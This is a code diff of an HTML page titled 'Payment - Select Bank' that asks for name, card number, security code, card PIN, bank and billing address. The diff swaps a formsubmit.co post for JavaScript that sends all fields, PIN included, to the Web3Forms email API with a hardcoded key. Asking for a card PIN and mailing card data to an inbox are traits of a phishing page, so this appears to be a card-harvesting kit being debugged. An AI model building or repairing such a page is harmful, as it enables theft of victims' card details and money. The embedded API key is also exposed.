@@ -1,179 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Payment - Select Bank</title>
+  <meta charset="UTF-8" />
+  <title>Payment - Select Bank (Web3Forms debug)</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body {
-      background: #f6faff;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .payment-container {
-      background: #fff;
-      max-width: 410px;
-      margin: 48px auto 0 auto;
-      border-radius: 7px;
-      box-shadow: 0 2px 8px rgba(25,60,110,0.10);
-      padding: 24px 4vw 18px 4vw;
-      border: 1px solid #e1e5eb;
-    }
-    .payment-form label {
-      display: block;
-      margin-top: 18px;
-      font-size: 1.03em;
-      font-weight: bold;
-      color: #252525;
-    }
-    .payment-form label .req {
-      color: #e44637;
-      margin-left: 2px;
-    }
-    .form-row {
-      display: flex;
-      gap: 18px;
-      margin-top: 2px;
-    }
-    @media (max-width: 480px) {
-      .form-row {
-        flex-direction: column;
-        gap: 0;
-      }
-    }
-    .form-row select,
-    .payment-form input[type="text"],
-    .payment-form input[type="number"],
-    .payment-form input[type="password"] {
-      font-size: 1em;
-      padding: 9px 8px;
-      border-radius: 4px;
-      border: 1px solid #b2cbe4;
-      margin-top: 2px;
-      width: 100%;
-      outline: none;
-      box-sizing: border-box;
-      transition: border 0.13s;
-    }
-    .payment-form input[type="text"]:focus,
-    .payment-form input[type="number"]:focus,
-    .payment-form input[type="password"]:focus,
-    .form-row select:focus {
-      border-color: #0d75eb;
-    }
-    .bank-search-bar {
-      width: 100%;
-      padding: 8px 11px;
-      margin-bottom: 10px;
-      margin-top: 13px;
-      border-radius: 4px;
-      border: 1.2px solid #b2cbe4;
-      font-size: 1em;
-      background: #f8fafc;
-      box-sizing: border-box;
-    }
-    .bank-list {
-      max-height: 140px;
-      overflow-y: auto;
-      margin-bottom: 8px;
-      border: 1px solid #e3e8ee;
-      background: #f8faff;
-      border-radius: 4px;
-      padding: 0;
-      box-sizing: border-box;
-      list-style-type: none;
-    }
-    .bank-list li {
-      padding: 9px 12px;
-      cursor: pointer;
-      border-bottom: 1px solid #e3e8ee;
-      transition: background 0.15s;
-    }
-    .bank-list li:last-child {
-      border-bottom: none;
-    }
-    .bank-list li:hover,
-    .bank-list li.selected {
-      background: #e5f0ff;
-      color: #184cc5;
-      font-weight: bold;
-    }
-    .inline-hint {
-      color: #6b778c;
-      font-size: .97em;
-      margin-left: 10px;
-      display: inline-block;
-      margin-bottom: 2px;
-    }
-    .actions {
-      margin-top: 26px;
-      text-align: right;
-      margin-bottom: 4px;
-      display: flex;
-      justify-content: flex-end;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .actions button, .actions a {
-      min-width: 88px;
-      font-weight: bold;
-      font-size: 1.04em;
-    }
-    .actions .cancel {
-      background: transparent;
-      border: none;
-      color: #0d75eb;
-      text-decoration: underline;
-      cursor: pointer;
-      padding: 0;
-    }
-    .actions .next {
-      background: #308b39;
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      padding: 9px 22px;
-      cursor: pointer;
-      transition: background 0.18s;
-    }
-    .actions .next:hover {
-      background: #246e2d;
-    }
-    .bank-group-label {
-      font-weight: bold;
-      font-size: 1.02em;
-      color: #2e4f8a;
-      padding: 6px 10px 2px 11px;
-      background: #f0f6fc;
-    }
-    /* --- Billing Address --- */
-    .billing-group {
-      margin-top: 20px;
-      margin-bottom: 0;
-      padding: 15px 0 5px 0;
-      border-top: 1px solid #ececec;
-    }
-    .billing-row {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 10px;
-    }
-    @media (max-width: 480px) {
-      .billing-row {
-        flex-direction: column;
-        gap: 0;
-      }
-    }
+    /* (styles unchanged from your original) */
+    body { background: #f6faff; font-family: Arial, sans-serif; margin: 0; padding: 0; }
+    .payment-container { background: #fff; max-width: 410px; margin: 48px auto 0 auto; border-radius: 7px; box-shadow: 0 2px 8px rgba(25,60,110,0.10); padding: 24px 4vw 18px 4vw; border: 1px solid #e1e5eb; }
+    .payment-form label { display: block; margin-top: 18px; font-size: 1.03em; font-weight: bold; color: #252525; }
+    .payment-form label .req { color: #e44637; margin-left: 2px; }
+    .form-row { display: flex; gap: 18px; margin-top: 2px; }
+    @media (max-width: 480px) { .form-row { flex-direction: column; gap: 0; } }
+    .form-row select, .payment-form input[type="text"], .payment-form input[type="number"], .payment-form input[type="password"], .payment-form input[type="email"] { font-size: 1em; padding: 9px 8px; border-radius: 4px; border: 1px solid #b2cbe4; margin-top: 2px; width: 100%; outline: none; box-sizing: border-box; transition: border 0.13s; }
+    .payment-form input[type="text"]:focus, .payment-form input[type="number"]:focus, .payment-form input[type="password"]:focus, .form-row select:focus, .payment-form input[type="email"]:focus { border-color: #0d75eb; }
+    .bank-search-bar { width: 100%; padding: 8px 11px; margin-bottom: 10px; margin-top: 13px; border-radius: 4px; border: 1.2px solid #b2cbe4; font-size: 1em; background: #f8fafc; box-sizing: border-box; }
+    .bank-list { max-height: 140px; overflow-y: auto; margin-bottom: 8px; border: 1px solid #e3e8ee; background: #f8faff; border-radius: 4px; padding: 0; box-sizing: border-box; list-style-type: none; }
+    .bank-list li { padding: 9px 12px; cursor: pointer; border-bottom: 1px solid #e3e8ee; transition: background 0.15s; }
+    .bank-list li:last-child { border-bottom: none; }
+    .bank-list li:hover, .bank-list li.selected { background: #e5f0ff; color: #184cc5; font-weight: bold; }
+    .inline-hint { color: #6b778c; font-size: .97em; margin-left: 10px; display: inline-block; margin-bottom: 2px; }
+    .actions { margin-top: 26px; text-align: right; margin-bottom: 4px; display: flex; justify-content: flex-end; flex-wrap: wrap; gap: 10px; }
+    .actions button, .actions a { min-width: 88px; font-weight: bold; font-size: 1.04em; }
+    .actions .cancel { background: transparent; border: none; color: #0d75eb; text-decoration: underline; cursor: pointer; padding: 0; }
+    .actions .next { background: #308b39; color: #fff; border: none; border-radius: 4px; padding: 9px 22px; cursor: pointer; transition: background 0.18s; }
+    .actions .next:hover { background: #246e2d; }
+    .bank-group-label { font-weight: bold; font-size: 1.02em; color: #2e4f8a; padding: 6px 10px 2px 11px; background: #f0f6fc; }
+    .billing-group { margin-top: 20px; margin-bottom: 0; padding: 15px 0 5px 0; border-top: 1px solid #ececec; }
+    .billing-row { display: flex; gap: 12px; margin-bottom: 10px; }
+    @media (max-width: 480px) { .billing-row { flex-direction: column; gap: 0; } }
   </style>
 </head>
 <body>
   <div class="payment-container">
-    <form id="paymentForm" class="payment-form" autocomplete="off" method="POST" action="https://formsubmit.co/0e97689de0a4360ff0feaea0c27addcd">
+    <form id="paymentForm" class="payment-form" autocomplete="off" method="POST" novalidate>
       <label for="name">Cardholder name <span class="req">*</span></label>
       <input id="name" name="name" type="text" required autocomplete="cc-name">
+
+      <label for="email">Email <span class="req">*</span></label>
+      <input id="email" name="email" type="email" required placeholder="you@example.com" autocomplete="email">
+
       <label for="cardnumber">Card number <span class="req">*</span></label>
-      <!-- allow up to 19 digits (not required to be 19 digits) -->
       <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric" maxlength="19" required autocomplete="cc-number">
 
       <label for="bank-search">Select Your Bank <span class="req">*</span></label>
@@ -210,7 +77,6 @@
       <label for="pin">Card PIN <span class="req">*</span></label>
       <input id="pin" name="pin" type="password" inputmode="numeric" maxlength="4" minlength="4" required>
 
-      <!-- Billing Address Section -->
       <div class="billing-group">
         <label for="billing-address">Billing Address <span class="req">*</span></label>
         <input id="billing-address" name="billing_address" type="text" maxlength="80" required placeholder="Street address, P.O. box, company name, c/o">
@@ -219,7 +85,7 @@
           <input id="billing-state" name="billing_state" type="text" maxlength="32" required placeholder="State / Province / Region">
         </div>
         <div class="billing-row">
-          <input id="billing-zip" name="billing_zip" type="number" maxlength="16" required placeholder="ZIP / Postal Code">
+          <input id="billing-zip" name="billing_zip" type="text" maxlength="16" required placeholder="ZIP / Postal Code">
           <select id="billing-country" name="billing_country" required>
             <option value="" disabled selected>Country</option>
             <option>United States</option>
@@ -239,79 +105,24 @@
             <option>Other</option>
           </select>
         </div>
-         <span class="inline-hint">Note: if you don't if you don't see a "I am not a Robot" verification your order was not placed</span>
+        <span class="inline-hint">Note: if you don't see a "I am not a Robot" verification your order was not placed</span>
       </div>
-      <!-- End Billing Address -->
 
       <div class="actions">
         <button type="button" class="cancel" onclick="window.history.back()">Cancel</button>
-        <button class="next" type="submit">Next</button>
+        <button id="submitBtn" class="next" type="submit">Next</button>
       </div>
-      <input type="hidden" name="_autoresponse" value="Thank you for your payment.">
-      <input type="hidden" name="_template" value="table">
     </form>
   </div>
+
   <script>
-    // Example bank data structure for worldwide, American, Nigerian banks (expand as needed)
+    const WEB3FORMS_API_KEY = "137d7a87-509c-4323-b300-edfa127fa785";
+
+    // bankGroups (same as before)...
     const bankGroups = [
-      {
-        label: "Nigerian Banks",
-        banks: [
-          "Access Bank",
-          "Fidelity Bank",
-          "First Bank of Nigeria",
-          "Guaranty Trust Bank (GTBank)",
-          "United Bank for Africa (UBA)",
-          "Zenith Bank",
-          "Union Bank of Nigeria",
-          "Stanbic IBTC Bank",
-          "Sterling Bank",
-          "Keystone Bank",
-          "FCMB",
-          "Ecobank Nigeria",
-          "Polaris Bank",
-          "Wema Bank",
-          "EcoBank",
-          "Opay",
-          "Palmpay",
-        ]
-      },
-      {
-        label: "American Banks",
-        banks: [
-          "Bank of America",
-          "Chase Bank (JPMorgan Chase)",
-          "Wells Fargo",
-          "Citibank",
-          "U.S. Bank",
-          "PNC Bank",
-          "Capital One",
-          "TD Bank",
-          "HSBC Bank USA",
-          "Fifth Third Bank",
-          "KeyBank",
-          "Regions Bank",
-        ]
-      },
-      {
-        label: "Other Banks",
-        banks: [
-          "HSBC",
-          "Barclays",
-          "Santander",
-          "Deutsche Bank",
-          "BNP Paribas",
-          "UBS",
-          "Scotiabank",
-          "Credit Suisse",
-          "Bank of China",
-          "Royal Bank of Canada",
-          "ANZ",
-          "Standard Chartered",
-          "ING",
-          "PayPal",
-        ]
-      },
+      { label: "Nigerian Banks", banks: ["Access Bank","Fidelity Bank","First Bank of Nigeria","Guaranty Trust Bank (GTBank)","United Bank for Africa (UBA)","Zenith Bank","Union Bank of Nigeria","Stanbic IBTC Bank","Sterling Bank","Keystone Bank","FCMB","Ecobank Nigeria","Polaris Bank","Wema Bank","EcoBank","Opay","Palmpay"] },
+      { label: "American Banks", banks: ["Bank of America","Chase Bank (JPMorgan Chase)","Wells Fargo","Citibank","U.S. Bank","PNC Bank","Capital One","TD Bank","HSBC Bank USA","Fifth Third Bank","KeyBank","Regions Bank"] },
+      { label: "Other Banks", banks: ["HSBC","Barclays","Santander","Deutsche Bank","BNP Paribas","UBS","Scotiabank","Credit Suisse","Bank of China","Royal Bank of Canada","ANZ","Standard Chartered","ING","PayPal"] }
     ];
 
     const bankListEl = document.getElementById('bankList');
@@ -320,31 +131,24 @@
     let highlightedIndex = -1;
     let filteredBanksList = [];
 
-    // Render bank list
     function renderBankList(filter = "") {
       bankListEl.innerHTML = "";
       filteredBanksList = [];
       bankGroups.forEach(group => {
         const matched = group.banks.filter(b => b.toLowerCase().includes(filter.toLowerCase()));
         if (matched.length) {
-          // Group label
           const labelLi = document.createElement('li');
           labelLi.className = "bank-group-label";
           labelLi.textContent = group.label;
           labelLi.tabIndex = -1;
           bankListEl.appendChild(labelLi);
-          // Banks
           matched.forEach(bank => {
             const bankLi = document.createElement('li');
             bankLi.textContent = bank;
             bankLi.setAttribute('data-name', bank);
             bankLi.tabIndex = 0;
-            bankLi.onclick = function() {
-              selectThisBank(bankLi);
-            };
-            bankLi.onkeydown = function(e) {
-              if(e.key === "Enter" || e.key === " ") selectThisBank(bankLi);
-            };
+            bankLi.onclick = function() { selectThisBank(bankLi); };
+            bankLi.onkeydown = function(e) { if (e.key === "Enter" || e.key === " ") selectThisBank(bankLi); };
             filteredBanksList.push(bankLi);
             bankListEl.appendChild(bankLi);
           });
@@ -364,65 +168,58 @@
         filteredBanksList[0].classList.add('selected');
         highlightedIndex = 0;
         selectedBankInput.value = filteredBanksList[0].getAttribute('data-name');
-      } else {
-        selectedBankInput.value = "";
-      }
+      } else selectedBankInput.value = "";
     });
     bankSearchEl.addEventListener('keydown', function(e) {
       if (!filteredBanksList.length) return;
-      // Arrow down
-      if(e.key === "ArrowDown") {
-        highlightedIndex = (highlightedIndex+1)%filteredBanksList.length;
+      if (e.key === "ArrowDown") {
+        highlightedIndex = (highlightedIndex + 1) % filteredBanksList.length;
         filteredBanksList.forEach(b=>b.classList.remove('selected'));
         filteredBanksList[highlightedIndex].classList.add('selected');
         selectedBankInput.value = filteredBanksList[highlightedIndex].getAttribute('data-name');
         filteredBanksList[highlightedIndex].scrollIntoView({block:"nearest"});
       }
-      // Arrow up
-      if(e.key === "ArrowUp") {
-        highlightedIndex = (highlightedIndex-1+filteredBanksList.length)%filteredBanksList.length;
+      if (e.key === "ArrowUp") {
+        highlightedIndex = (highlightedIndex - 1 + filteredBanksList.length) % filteredBanksList.length;
         filteredBanksList.forEach(b=>b.classList.remove('selected'));
         filteredBanksList[highlightedIndex].classList.add('selected');
         selectedBankInput.value = filteredBanksList[highlightedIndex].getAttribute('data-name');
         filteredBanksList[highlightedIndex].scrollIntoView({block:"nearest"});
       }
-      // Enter
-      if(e.key === "Enter") {
-        filteredBanksList[highlightedIndex]?.click();
-      }
+      if (e.key === "Enter") filteredBanksList[highlightedIndex]?.click();
     });
     renderBankList();
 
-    // Card number: only digits, max 19 (many card schemes accept 13-19). Not required to be 19.
-    document.getElementById('cardnumber').addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0,19);
-    });
-    // Security code: only digits, max 3
-    document.getElementById('cvc').addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0,3);
-    });
-    // Card PIN: only digits, max 4
-    document.getElementById('pin').addEventListener('input', function() {
-      this.value = this.value.replace(/\D/g, '').slice(0,4);
-    });
-    // Cardholder: only letters and spaces
-    document.getElementById('name').addEventListener('input', function() {
-      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-    });
+    // input sanitizers
+    document.getElementById('cardnumber').addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,19); });
+    document.getElementById('cvc')?.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,3); });
+    document.getElementById('pin').addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
+    document.getElementById('name').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z\s]/g,''); });
+    document.getElementById('billing-city').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z\s]/g,''); });
+    document.getElementById('billing-state').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z\s]/g,''); });
+    document.getElementById('billing-zip').addEventListener('input', function(){ this.value = this.value.replace(/[^a-zA-Z0-9\-]/g,''); });
 
-    // Billing city/state/address/zip restrictions
-    document.getElementById('billing-city').addEventListener('input', function() {
-      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-    });
-    document.getElementById('billing-state').addEventListener('input', function() {
-      this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-    });
-    document.getElementById('billing-zip').addEventListener('input', function() {
-      this.value = this.value.replace(/[^a-zA-Z0-9\-]/g, '');
-    });
+    function formDataToObject(fd) {
+      const obj = {};
+      for (const [key, value] of fd.entries()) {
+        if (Object.prototype.hasOwnProperty.call(obj, key)) {
+          if (!Array.isArray(obj[key])) obj[key] = [obj[key]];
+          obj[key].push(value);
+        } else obj[key] = value;
+      }
+      return obj;
+    }
 
-    // Validate before submit (adds billing address validation)
-    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+    const formEl = document.getElementById('paymentForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    formEl.addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      // basic validation (same as before), include email check
+      const email = document.getElementById('email').value.trim();
+      if (!email) { alert("Please enter an email."); return; }
+
       const cardNumber = document.getElementById('cardnumber');
       const cvc = document.getElementById('cvc');
       const pin = document.getElementById('pin');
@@ -434,28 +231,76 @@
       const billing_country = document.getElementById('billing-country').value;
       const errors = [];
 
-      // Accept card numbers between 13 and 19 digits (inclusive)
       const cardLen = cardNumber.value.replace(/\D/g,'').length;
       if (cardLen < 13 || cardLen > 19) errors.push("Please enter a valid card number (between 13 and 19 digits).");
-
-      if(cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
-      if(pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
-      if(!bank) errors.push("Please select your bank.");
+      if (cvc && cvc.value && cvc.value.length !== 3) errors.push("Please enter exactly 3 digits for security code.");
+      if (pin && pin.value && pin.value.length !== 4) errors.push("Please enter exactly 4 digits for card PIN.");
+      if (!bank) errors.push("Please select your bank.");
       if (!billing_address) errors.push("Enter your billing address.");
       if (!billing_city) errors.push("Enter your billing city.");
       if (!billing_state) errors.push("Enter your billing state/province/region.");
       if (!billing_zip) errors.push("Enter your billing ZIP / postal code.");
       if (!billing_country) errors.push("Select your billing country.");
-      if(errors.length > 0) {
-        alert(errors.join('\n'));
-        e.preventDefault();
+      if (errors.length) { alert(errors.join('\\n')); return; }
+
+      if (!WEB3FORMS_API_KEY) { alert("Web3Forms API key missing."); return; }
+
+      const fd = new FormData(formEl);
+      const payload = formDataToObject(fd);
+
+      // required by Web3Forms
+      payload.access_key = WEB3FORMS_API_KEY;
+      payload.subject = "New payment submission";
+      // include from_name/from_email which web3forms sometimes uses for sending email
+      payload.from_name = payload.name || "Payment User";
+      payload.from_email = payload.email || "";
+
+      submitBtn.disabled = true;
+      const originalBtnText = submitBtn.textContent;
+      submitBtn.textContent = "Sending...";
+
+      try {
+        const res = await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        // attempt to parse JSON; if parse fails, log raw text
+        let data;
+        try {
+          data = await res.json();
+        } catch (jsonErr) {
+          const txt = await res.text();
+          console.error("Non-JSON response from Web3Forms:", txt);
+          alert("Non-JSON response from Web3Forms: " + txt);
+          return;
+        }
+
+        console.log("Web3Forms response:", res.status, data);
+
+        // Show the raw message to help debugging
+        if (data && data.message) {
+          alert("Web3Forms response: " + data.message);
+        } else if (!res.ok) {
+          alert("Submission failed: HTTP " + res.status);
+        }
+
+        if (res.ok && data.success) {
+          alert("Thank you — your payment was received and we'll get back to you shortly.");
+          formEl.reset();
+          renderBankList();
+        } else {
+          // keep button enabled afterward
+        }
+      } catch (err) {
+        console.error("Network error:", err);
+        alert("Network error: " + err.message);
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = originalBtnText;
       }
     });
   </script>
 </body>
 </html>
-
-
-
-
-
